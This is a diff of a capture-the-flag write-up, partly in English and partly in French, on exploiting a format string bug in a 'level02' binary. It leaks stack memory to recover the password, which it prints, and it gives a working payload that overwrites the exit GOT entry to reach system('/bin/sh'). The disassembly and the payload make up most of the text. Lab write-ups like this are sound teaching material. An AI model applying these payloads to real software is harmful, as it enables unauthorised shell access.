@@ -10,6 +10,8 @@ So it appear quite secure.
 
 However we can notice that the user name is printed through a printf call if it's the wrong password. We gone use the format string vulnerability.
 
+## First way to do it:
+
 This attack will print the raw memory of the buffers in order to get the read password.
 
 ```bash
@@ -31,18 +33,69 @@ We also know that the maximum number of character read is 41 so we can ignore wh
 
 Now we can reverse each hexadecimal chunk in order to get them back to big endian then convert it to ascii string.
 
-
+```
 48 75 6e 50 52 34 37 68 -> Hh74RPnu
 51 45 41 4a 35 61 73 39 -> Q9sa5JAE
 58 37 7a 71 43 57 4e 67 -> XgNWCqz7
 73 35 4a 35 68 6e 47 58 -> sXGnh5J5
 4d 48 33 67 50 66 4b 39 -> M9KfPg3H
+```
 
-The last three bits are ignore because it correspond to the end of the string.
+The last three bytes are ignore because it correspond to the end of the string.
 00 ff fe
 
 So the password is:
+
+```
 Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
 
+## Deuxieme maniere d'y arriver:
 
+On va utiliser printf pour ecrire dans une adresse de notre choix.
+Dans notre cas , dans la fonction main on a un appel a `system "/bin/sh"`
 
+```
+0x400a85 <main+625>     mov    $0x400d32,%edi
+0x400a8a <main+630>     callq  0x4006b0 <system@plt>
+```
+
+```
+x/s 0x400d32
+0x400d32:        "/bin/sh"
+```
+
+On notifie aussi un appel a exit plus bas dans le code
+
+```
+0x400ab1 <main+669>     mov    $0x1,%edi
+0x400ab6 <main+674>     callq  0x400710 <exit@plt>
+```
+
+On va tenter de remplacer l'appel exit@plt a un appel a notre fonction main a l'adresse `0x400a85` soit en decimal 4196997
+
+On disas exit@plt
+
+```
+disas exit
+#0x601228
+```
+
+On remarque qu'en affichant les prochains octets de la stack on tombe rapidement sur le deuxieme buffer:
+
+```
+./level0
+username: %x %x %x %x %x %x %x %x %x %x
+password: AAAA
+ffffe580 0 41 2a2a2a2a 2a2a2a2a ffffe778 f7ff9a08 41414141 0 0 0 0 0 0 does not have access!
+```
+
+Nous avons donc toutes les ressources necessaires pour rediriger l'execution du code vers la portion qui nous interesse:
+
+```
+(python -c 'print "%4196997c%8$n" + "\n" + "\x28\x12\x60"' ; cat) | ./level02
+```
+
+```
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+```
